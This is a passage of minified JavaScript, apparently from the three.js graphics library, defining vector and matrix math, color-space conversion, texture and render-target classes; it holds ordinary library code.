this.applyMatrix3(e).normalize()}applyMatrix4(e){const n=this.x,i=this.y,s=this.z,r=e.elements,a=1/(r[3]*n+r[7]*i+r[11]*s+r[15]);return this.x=(r[0]*n+r[4]*i+r[8]*s+r[12])*a,this.y=(r[1]*n+r[5]*i+r[9]*s+r[13])*a,this.z=(r[2]*n+r[6]*i+r[10]*s+r[14])*a,this}applyQuaternion(e){const n=this.x,i=this.y,s=this.z,r=e.x,a=e.y,o=e.z,l=e.w,c=2*(a*s-o*i),d=2*(o*n-r*s),p=2*(r*i-a*n);return this.x=n+l*c+a*p-o*d,this.y=i+l*d+o*c-r*p,this.z=s+l*p+r*d-a*c,this}project(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)}unproject(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)}transformDirection(e){const n=this.x,i=this.y,s=this.z,r=e.elements;return this.x=r[0]*n+r[4]*i+r[8]*s,this.y=r[1]*n+r[5]*i+r[9]*s,this.z=r[2]*n+r[6]*i+r[10]*s,this.normalize()}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this}divideScalar(e){return this.multiplyScalar(1/e)}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this}clamp(e,n){return this.x=je(this.x,e.x,n.x),this.y=je(this.y,e.y,n.y),this.z=je(this.z,e.z,n.z),this}clampScalar(e,n){return this.x=je(this.x,e,n),this.y=je(this.y,e,n),this.z=je(this.z,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(je(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this.z+=(e.z-this.z)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this.z=e.z+(n.z-e.z)*i,this}cross(e){return this.crossVectors(this,e)}crossVectors(e,n){const i=e.x,s=e.y,r=e.z,a=n.x,o=n.y,l=n.z;return this.x=s*l-r*o,this.y=r*a-i*l,this.z=i*o-s*a,this}projectOnVector(e){const n=e.lengthSq();if(n===0)return this.set(0,0,0);const i=e.dot(this)/n;return this.copy(e).multiplyScalar(i)}projectOnPlane(e){return Gc.copy(this).projectOnVector(e),this.sub(Gc)}reflect(e){return this.sub(Gc.copy(e).multiplyScalar(2*this.dot(e)))}angleTo(e){const n=Math.sqrt(this.lengthSq()*e.lengthSq());if(n===0)return Math.PI/2;const i=this.dot(e)/n;return Math.acos(je(i,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const n=this.x-e.x,i=this.y-e.y,s=this.z-e.z;return n*n+i*i+s*s}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)}setFromSpherical(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)}setFromSphericalCoords(e,n,i){const s=Math.sin(n)*e;return this.x=s*Math.sin(i),this.y=Math.cos(n)*e,this.z=s*Math.cos(i),this}setFromCylindrical(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)}setFromCylindricalCoords(e,n,i){return this.x=e*Math.sin(n),this.y=i,this.z=e*Math.cos(n),this}setFromMatrixPosition(e){const n=e.elements;return this.x=n[12],this.y=n[13],this.z=n[14],this}setFromMatrixScale(e){const n=this.setFromMatrixColumn(e,0).length(),i=this.setFromMatrixColumn(e,1).length(),s=this.setFromMatrixColumn(e,2).length();return this.x=n,this.y=i,this.z=s,this}setFromMatrixColumn(e,n){return this.fromArray(e.elements,n*4)}setFromMatrix3Column(e,n){return this.fromArray(e.elements,n*3)}setFromEuler(e){return this.x=e._x,this.y=e._y,this.z=e._z,this}setFromColor(e){return this.x=e.r,this.y=e.g,this.z=e.b,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this.z=e[n+2],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e[n+2]=this.z,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this.z=e.getZ(n),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this}randomDirection(){const e=Math.random()*Math.PI*2,n=Math.random()*2-1,i=Math.sqrt(1-n*n);return this.x=i*Math.cos(e),this.y=n,this.z=i*Math.sin(e),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z}}const Gc=new B,sm=new so;class Fe{constructor(e,n,i,s,r,a,o,l,c){Fe.prototype.isMatrix3=!0,this.elements=[1,0,0,0,1,0,0,0,1],e!==void 0&&this.set(e,n,i,s,r,a,o,l,c)}set(e,n,i,s,r,a,o,l,c){const d=this.elements;return d[0]=e,d[1]=s,d[2]=o,d[3]=n,d[4]=r,d[5]=l,d[6]=i,d[7]=a,d[8]=c,this}identity(){return this.set(1,0,0,0,1,0,0,0,1),this}copy(e){const n=this.elements,i=e.elements;return n[0]=i[0],n[1]=i[1],n[2]=i[2],n[3]=i[3],n[4]=i[4],n[5]=i[5],n[6]=i[6],n[7]=i[7],n[8]=i[8],this}extractBasis(e,n,i){return e.setFromMatrix3Column(this,0),n.setFromMatrix3Column(this,1),i.setFromMatrix3Column(this,2),this}setFromMatrix4(e){const n=e.elements;return this.set(n[0],n[4],n[8],n[1],n[5],n[9],n[2],n[6],n[10]),this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,n){const i=e.elements,s=n.elements,r=this.elements,a=i[0],o=i[3],l=i[6],c=i[1],d=i[4],p=i[7],h=i[2],f=i[5],_=i[8],y=s[0],m=s[3],u=s[6],g=s[1],x=s[4],S=s[7],T=s[2],A=s[5],R=s[8];return r[0]=a*y+o*g+l*T,r[3]=a*m+o*x+l*A,r[6]=a*u+o*S+l*R,r[1]=c*y+d*g+p*T,r[4]=c*m+d*x+p*A,r[7]=c*u+d*S+p*R,r[2]=h*y+f*g+_*T,r[5]=h*m+f*x+_*A,r[8]=h*u+f*S+_*R,this}multiplyScalar(e){const n=this.elements;return n[0]*=e,n[3]*=e,n[6]*=e,n[1]*=e,n[4]*=e,n[7]*=e,n[2]*=e,n[5]*=e,n[8]*=e,this}determinant(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],d=e[8];return n*a*d-n*o*c-i*r*d+i*o*l+s*r*c-s*a*l}invert(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],d=e[8],p=d*a-o*c,h=o*l-d*r,f=c*r-a*l,_=n*p+i*h+s*f;if(_===0)return this.set(0,0,0,0,0,0,0,0,0);const y=1/_;return e[0]=p*y,e[1]=(s*c-d*i)*y,e[2]=(o*i-s*a)*y,e[3]=h*y,e[4]=(d*n-s*l)*y,e[5]=(s*r-o*n)*y,e[6]=f*y,e[7]=(i*l-c*n)*y,e[8]=(a*n-i*r)*y,this}transpose(){let e;const n=this.elements;return e=n[1],n[1]=n[3],n[3]=e,e=n[2],n[2]=n[6],n[6]=e,e=n[5],n[5]=n[7],n[7]=e,this}getNormalMatrix(e){return this.setFromMatrix4(e).invert().transpose()}transposeIntoArray(e){const n=this.elements;return e[0]=n[0],e[1]=n[3],e[2]=n[6],e[3]=n[1],e[4]=n[4],e[5]=n[7],e[6]=n[2],e[7]=n[5],e[8]=n[8],this}setUvTransform(e,n,i,s,r,a,o){const l=Math.cos(r),c=Math.sin(r);return this.set(i*l,i*c,-i*(l*a+c*o)+a+e,-s*c,s*l,-s*(-c*a+l*o)+o+n,0,0,1),this}scale(e,n){return this.premultiply(Wc.makeScale(e,n)),this}rotate(e){return this.premultiply(Wc.makeRotation(-e)),this}translate(e,n){return this.premultiply(Wc.makeTranslation(e,n)),this}makeTranslation(e,n){return e.isVector2?this.set(1,0,e.x,0,1,e.y,0,0,1):this.set(1,0,e,0,1,n,0,0,1),this}makeRotation(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,-i,0,i,n,0,0,0,1),this}makeScale(e,n){return this.set(e,0,0,0,n,0,0,0,1),this}equals(e){const n=this.elements,i=e.elements;for(let s=0;s<9;s++)if(n[s]!==i[s])return!1;return!0}fromArray(e,n=0){for(let i=0;i<9;i++)this.elements[i]=e[i+n];return this}toArray(e=[],n=0){const i=this.elements;return e[n]=i[0],e[n+1]=i[1],e[n+2]=i[2],e[n+3]=i[3],e[n+4]=i[4],e[n+5]=i[5],e[n+6]=i[6],e[n+7]=i[7],e[n+8]=i[8],e}clone(){return new this.constructor().fromArray(this.elements)}}const Wc=new Fe,rm=new Fe().set(.4123908,.3575843,.1804808,.212639,.7151687,.0721923,.0193308,.1191948,.9505322),am=new Fe().set(3.2409699,-1.5373832,-.4986108,-.9692436,1.8759675,.0415551,.0556301,-.203977,1.0569715);function yw(){const t={enabled:!0,workingColorSpace:Or,spaces:{},convert:function(s,r,a){return this.enabled===!1||r===a||!r||!a||(this.spaces[r].transfer===st&&(s.r=Ti(s.r),s.g=Ti(s.g),s.b=Ti(s.b)),this.spaces[r].primaries!==this.spaces[a].primaries&&(s.applyMatrix3(this.spaces[r].toXYZ),s.applyMatrix3(this.spaces[a].fromXYZ)),this.spaces[a].transfer===st&&(s.r=Tr(s.r),s.g=Tr(s.g),s.b=Tr(s.b))),s},workingToColorSpace:function(s,r){return this.convert(s,this.workingColorSpace,r)},colorSpaceToWorking:function(s,r){return this.convert(s,r,this.workingColorSpace)},getPrimaries:function(s){return this.spaces[s].primaries},getTransfer:function(s){return s===qi?Fl:this.spaces[s].transfer},getToneMappingMode:function(s){return this.spaces[s].outputColorSpaceConfig.toneMappingMode||"standard"},getLuminanceCoefficients:function(s,r=this.workingColorSpace){return s.fromArray(this.spaces[r].luminanceCoefficients)},define:function(s){Object.assign(this.spaces,s)},_getMatrix:function(s,r,a){return s.copy(this.spaces[r].toXYZ).multiply(this.spaces[a].fromXYZ)},_getDrawingBufferColorSpace:function(s){return this.spaces[s].outputColorSpaceConfig.drawingBufferColorSpace},_getUnpackColorSpace:function(s=this.workingColorSpace){return this.spaces[s].workingColorSpaceConfig.unpackColorSpace},fromWorkingColorSpace:function(s,r){return qa("ColorManagement: .fromWorkingColorSpace() has been renamed to .workingToColorSpace()."),t.workingToColorSpace(s,r)},toWorkingColorSpace:function(s,r){return qa("ColorManagement: .toWorkingColorSpace() has been renamed to .colorSpaceToWorking()."),t.colorSpaceToWorking(s,r)}},e=[.64,.33,.3,.6,.15,.06],n=[.2126,.7152,.0722],i=[.3127,.329];return t.define({[Or]:{primaries:e,whitePoint:i,transfer:Fl,toXYZ:rm,fromXYZ:am,luminanceCoefficients:n,workingColorSpaceConfig:{unpackColorSpace:Pn},outputColorSpaceConfig:{drawingBufferColorSpace:Pn}},[Pn]:{primaries:e,whitePoint:i,transfer:st,toXYZ:rm,fromXYZ:am,luminanceCoefficients:n,outputColorSpaceConfig:{drawingBufferColorSpace:Pn}}}),t}const Ye=yw();function Ti(t){return t<.04045?t*.0773993808:Math.pow(t*.9478672986+.0521327014,2.4)}function Tr(t){return t<.0031308?t*12.92:1.055*Math.pow(t,.41666)-.055}let qs;class Sw{static getDataURL(e,n="image/png"){if(/^data:/i.test(e.src)||typeof HTMLCanvasElement>"u")return e.src;let i;if(e instanceof HTMLCanvasElement)i=e;else{qs===void 0&&(qs=zl("canvas")),qs.width=e.width,qs.height=e.height;const s=qs.getContext("2d");e instanceof ImageData?s.putImageData(e,0,0):s.drawImage(e,0,0,e.width,e.height),i=qs}return i.toDataURL(n)}static sRGBToLinear(e){if(typeof HTMLImageElement<"u"&&e instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&e instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&e instanceof ImageBitmap){const n=zl("canvas");n.width=e.width,n.height=e.height;const i=n.getContext("2d");i.drawImage(e,0,0,e.width,e.height);const s=i.getImageData(0,0,e.width,e.height),r=s.data;for(let a=0;a<r.length;a++)r[a]=Ti(r[a]/255)*255;return i.putImageData(s,0,0),n}else if(e.data){const n=e.data.slice(0);for(let i=0;i<n.length;i++)n instanceof Uint8Array||n instanceof Uint8ClampedArray?n[i]=Math.floor(Ti(n[i]/255)*255):n[i]=Ti(n[i]);return{data:n,width:e.width,height:e.height}}else return Ne("ImageUtils.sRGBToLinear(): Unsupported image type. No color space conversion applied."),e}}let bw=0;class fh{constructor(e=null){this.isSource=!0,Object.defineProperty(this,"id",{value:bw++}),this.uuid=io(),this.data=e,this.dataReady=!0,this.version=0}getSize(e){const n=this.data;return typeof HTMLVideoElement<"u"&&n instanceof HTMLVideoElement?e.set(n.videoWidth,n.videoHeight,0):typeof VideoFrame<"u"&&n instanceof VideoFrame?e.set(n.displayHeight,n.displayWidth,0):n!==null?e.set(n.width,n.height,n.depth||0):e.set(0,0,0),e}set needsUpdate(e){e===!0&&this.version++}toJSON(e){const n=e===void 0||typeof e=="string";if(!n&&e.images[this.uuid]!==void 0)return e.images[this.uuid];const i={uuid:this.uuid,url:""},s=this.data;if(s!==null){let r;if(Array.isArray(s)){r=[];for(let a=0,o=s.length;a<o;a++)s[a].isDataTexture?r.push(jc(s[a].image)):r.push(jc(s[a]))}else r=jc(s);i.url=r}return n||(e.images[this.uuid]=i),i}}function jc(t){return typeof HTMLImageElement<"u"&&t instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&t instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&t instanceof ImageBitmap?Sw.getDataURL(t):t.data?{data:Array.from(t.data),width:t.width,height:t.height,type:t.data.constructor.name}:(Ne("Texture: Unable to serialize Texture."),{})}let ww=0;const Xc=new B;class Zt extends Gr{constructor(e=Zt.DEFAULT_IMAGE,n=Zt.DEFAULT_MAPPING,i=bi,s=bi,r=Kt,a=Ps,o=jn,l=Sn,c=Zt.DEFAULT_ANISOTROPY,d=qi){super(),this.isTexture=!0,Object.defineProperty(this,"id",{value:ww++}),this.uuid=io(),this.name="",this.source=new fh(e),this.mipmaps=[],this.mapping=n,this.channel=0,this.wrapS=i,this.wrapT=s,this.magFilter=r,this.minFilter=a,this.anisotropy=c,this.format=o,this.internalFormat=null,this.type=l,this.offset=new et(0,0),this.repeat=new et(1,1),this.center=new et(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new Fe,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.colorSpace=d,this.userData={},this.updateRanges=[],this.version=0,this.onUpdate=null,this.renderTarget=null,this.isRenderTargetTexture=!1,this.isArrayTexture=!!(e&&e.depth&&e.depth>1),this.pmremVersion=0}get width(){return this.source.getSize(Xc).x}get height(){return this.source.getSize(Xc).y}get depth(){return this.source.getSize(Xc).z}get image(){return this.source.data}set image(e=null){this.source.data=e}updateMatrix(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)}addUpdateRange(e,n){this.updateRanges.push({start:e,count:n})}clearUpdateRanges(){this.updateRanges.length=0}clone(){return new this.constructor().copy(this)}copy(e){return this.name=e.name,this.source=e.source,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.channel=e.channel,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.internalFormat=e.internalFormat,this.type=e.type,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.colorSpace=e.colorSpace,this.renderTarget=e.renderTarget,this.isRenderTargetTexture=e.isRenderTargetTexture,this.isArrayTexture=e.isArrayTexture,this.userData=JSON.parse(JSON.stringify(e.userData)),this.needsUpdate=!0,this}setValues(e){for(const n in e){const i=e[n];if(i===void 0){Ne(`Texture.setValues(): parameter '${n}' has value of undefined.`);continue}const s=this[n];if(s===void 0){Ne(`Texture.setValues(): property '${n}' does not exist.`);continue}s&&i&&s.isVector2&&i.isVector2||s&&i&&s.isVector3&&i.isVector3||s&&i&&s.isMatrix3&&i.isMatrix3?s.copy(i):this[n]=i}}toJSON(e){const n=e===void 0||typeof e=="string";if(!n&&e.textures[this.uuid]!==void 0)return e.textures[this.uuid];const i={metadata:{version:4.7,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,image:this.source.toJSON(e).uuid,mapping:this.mapping,channel:this.channel,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,internalFormat:this.internalFormat,type:this.type,colorSpace:this.colorSpace,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,generateMipmaps:this.generateMipmaps,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};return Object.keys(this.userData).length>0&&(i.userData=this.userData),n||(e.textures[this.uuid]=i),i}dispose(){this.dispatchEvent({type:"dispose"})}transformUv(e){if(this.mapping!==O0)return e;if(e.applyMatrix3(this.matrix),e.x<0||e.x>1)switch(this.wrapS){case Wa:e.x=e.x-Math.floor(e.x);break;case bi:e.x=e.x<0?0:1;break;case Td:Math.abs(Math.floor(e.x)%2)===1?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x);break}if(e.y<0||e.y>1)switch(this.wrapT){case Wa:e.y=e.y-Math.floor(e.y);break;case bi:e.y=e.y<0?0:1;break;case Td:Math.abs(Math.floor(e.y)%2)===1?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y);break}return this.flipY&&(e.y=1-e.y),e}set needsUpdate(e){e===!0&&(this.version++,this.source.needsUpdate=!0)}set needsPMREMUpdate(e){e===!0&&this.pmremVersion++}}Zt.DEFAULT_IMAGE=null;Zt.DEFAULT_MAPPING=O0;Zt.DEFAULT_ANISOTROPY=1;class Mt{constructor(e=0,n=0,i=0,s=1){Mt.prototype.isVector4=!0,this.x=e,this.y=n,this.z=i,this.w=s}get width(){return this.z}set width(e){this.z=e}get height(){return this.w}set height(e){this.w=e}set(e,n,i,s){return this.x=e,this.y=n,this.z=i,this.w=s,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this.w=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setW(e){return this.w=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;case 2:this.z=n;break;case 3:this.w=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z,this.w)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=e.w!==void 0?e.w:1,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this.z=e.z+n.z,this.w=e.w+n.w,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this.z+=e.z*n,this.w+=e.w*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this.z=e.z-n.z,this.w=e.w-n.w,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this.w*=e.w,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this}applyMatrix4(e){const n=this.x,i=this.y,s=this.z,r=this.w,a=e.elements;return this.x=a[0]*n+a[4]*i+a[8]*s+a[12]*r,this.y=a[1]*n+a[5]*i+a[9]*s+a[13]*r,this.z=a[2]*n+a[6]*i+a[10]*s+a[14]*r,this.w=a[3]*n+a[7]*i+a[11]*s+a[15]*r,this}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this.w/=e.w,this}divideScalar(e){return this.multiplyScalar(1/e)}setAxisAngleFromQuaternion(e){this.w=2*Math.acos(e.w);const n=Math.sqrt(1-e.w*e.w);return n<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=e.x/n,this.y=e.y/n,this.z=e.z/n),this}setAxisAngleFromRotationMatrix(e){let n,i,s,r;const l=e.elements,c=l[0],d=l[4],p=l[8],h=l[1],f=l[5],_=l[9],y=l[2],m=l[6],u=l[10];if(Math.abs(d-h)<.01&&Math.abs(p-y)<.01&&Math.abs(_-m)<.01){if(Math.abs(d+h)<.1&&Math.abs(p+y)<.1&&Math.abs(_+m)<.1&&Math.abs(c+f+u-3)<.1)return this.set(1,0,0,0),this;n=Math.PI;const x=(c+1)/2,S=(f+1)/2,T=(u+1)/2,A=(d+h)/4,R=(p+y)/4,N=(_+m)/4;return x>S&&x>T?x<.01?(i=0,s=.707106781,r=.707106781):(i=Math.sqrt(x),s=A/i,r=R/i):S>T?S<.01?(i=.707106781,s=0,r=.707106781):(s=Math.sqrt(S),i=A/s,r=N/s):T<.01?(i=.707106781,s=.707106781,r=0):(r=Math.sqrt(T),i=R/r,s=N/r),this.set(i,s,r,n),this}let g=Math.sqrt((m-_)*(m-_)+(p-y)*(p-y)+(h-d)*(h-d));return Math.abs(g)<.001&&(g=1),this.x=(m-_)/g,this.y=(p-y)/g,this.z=(h-d)/g,this.w=Math.acos((c+f+u-1)/2),this}setFromMatrixPosition(e){const n=e.elements;return this.x=n[12],this.y=n[13],this.z=n[14],this.w=n[15],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this}clamp(e,n){return this.x=je(this.x,e.x,n.x),this.y=je(this.y,e.y,n.y),this.z=je(this.z,e.z,n.z),this.w=je(this.w,e.w,n.w),this}clampScalar(e,n){return this.x=je(this.x,e,n),this.y=je(this.y,e,n),this.z=je(this.z,e,n),this.w=je(this.w,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(je(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this.w=Math.trunc(this.w),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this.z+=(e.z-this.z)*n,this.w+=(e.w-this.w)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this.z=e.z+(n.z-e.z)*i,this.w=e.w+(n.w-e.w)*i,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this.z=e[n+2],this.w=e[n+3],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e[n+2]=this.z,e[n+3]=this.w,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this.z=e.getZ(n),this.w=e.getW(n),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z,yield this.w}}class Mw extends Gr{constructor(e=1,n=1,i={}){super(),i=Object.assign({generateMipmaps:!1,internalFormat:null,minFilter:Kt,depthBuffer:!0,stencilBuffer:!1,resolveDepthBuffer:!0,resolveStencilBuffer:!0,depthTexture:null,samples:0,count:1,depth:1,multiview:!1},i),this.isRenderTarget=!0,this.width=e,this.height=n,this.depth=i.depth,this.scissor=new Mt(0,0,e,n),this.scissorTest=!1,this.viewport=new Mt(0,0,e,n);const s={width:e,height:n,depth:i.depth},r=new Zt(s);this.textures=[];const a=i.count;for(let o=0;o<a;o++)this.textures[o]=r.clone(),this.textures[o].isRenderTargetTexture=!0,this.textures[o].renderTarget=this;this._setTextureOptions(i),this.depthBuffer=i.depthBuffer,this.stencilBuffer=i.stencilBuffer,this.resolveDepthBuffer=i.resolveDepthBuffer,this.resolveStencilBuffer=i.resolveStencilBuffer,this._depthTexture=null,this.depthTexture=i.depthTexture,this.samples=i.samples,this.multiview=i.multiview}_setTextureOptions(e={}){const n={minFilter:Kt,generateMipmaps:!1,flipY:!1,internalFormat:null};e.mapping!==void 0&&(n.mapping=e.mapping),e.wrapS!==void 0&&(n.wrapS=e.wrapS),e.wrapT!==void 0&&(n.wrapT=e.wrapT),e.wrapR!==void 0&&(n.wrapR=e.wrapR),e.magFilter!==void 0&&(n.magFilter=e.magFilter),e.minFilter!==void 0&&(n.minFilter=e.minFilter),e.format!==void 0&&(n.format=e.format),e.type!==void 0&&(n.type=e.type),e.anisotropy!==void 0&&(n.anisotropy=e.anisotropy),e.colorSpace!==void 0&&(n.colorSpace=e.colorSpace),e.flipY!==void 0&&(n.flipY=e.flipY),e.generateMipmaps!==void 0&&(n.generateMipmaps=e.generateMipmaps),e.internalFormat!==void 0&&(n.internalFormat=e.internalFormat);for(let i=0;i<this.textures.length;i++)this.textures[i].setValues(n)}get texture(){return this.textures[0]}set texture(e){this.textures[0]=e}set depthTexture(e){this._depthTexture!==null&&(this._depthTexture.renderTarget=null),e!==null&&(e.renderTarget=this),this._depthTexture=e}get depthTexture(){return this._depthTexture}setSize(e,n,i=1){if(this.width!==e||this.height!==n||this.depth!==i){this.width=e,this.height=n,this.depth=i;for(let s=0,r=this.textures.length;s<r;s++)this.textures[s].image.width=e,this.textures[s].image.height=n,this.textures[s].image.depth=i,this.textures[s].isData3DTexture!==!0&&(this.textures[s].isArrayTexture=this.textures[s].image.depth>1);this.dispose()}this.viewport.set(0,0,e,n),this.scissor.set(0,0,e,n)}clone(){return new this.constructor().copy(this)}copy(e){this.width=e.width,this.height=e.height,this.depth=e.depth,this.scissor.copy(e.scissor),this.scissorTest=e.scissorTest,this.viewport.copy(e.viewport),this.textures.length=0;for(let n=0,i=e.textures.length;n<i;n++){this.textures[n]=e.textures[n].clone(),this.textures[n].isRenderTargetTexture=!0,this.textures[n].renderTarget=this;const s=Object.assign({},e.textures[n].image);this.textures[n].source=new fh(s)}return this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.resolveDepthBuffer=e.resolveDepthBuffer,this.resolveStencilBuffer=e.resolveStencilBuffer,e.depthTexture!==null&&(this.depthTexture=e.depthTexture.clone()),this.samples=e.samples,this}dispose(){this.dispatchEvent({type:"dispose"})}}class ai extends Mw{constructor(e=1,n=1,i={}){super(e,n,i),this.isWebGLRenderTarget=!0}}class q0 extends Zt{constructor(e=null,n=1,i=1,s=1){super(null),this.isDataArrayTexture=!0,this.image={data:e,width:n,height:i,depth:s},this.magFilter=Vt,this.minFilter=Vt,this.wrapR=bi,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1,this.layerUpdates=new Set}addLayerUpdate(e){this.layerUpdates.add(e)}clearLayerUpdates(){this.layerUpdates.clear()}}class Ew extends Zt{constructor(e=null,n=1,i=1,s=1){super(null),this.isData3DTexture=!0,this.image={data:e,width:n,height:i,depth:s},this.magFilter=Vt,this.minFilter=Vt,this.wrapR=bi,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}class ro{constructor(e=new B(1/0,1/0,1/0),n=new B(-1/0,-1/0,-1/0)){this.isBox3=!0,this.min=e,this.max=n}set(e,n){return 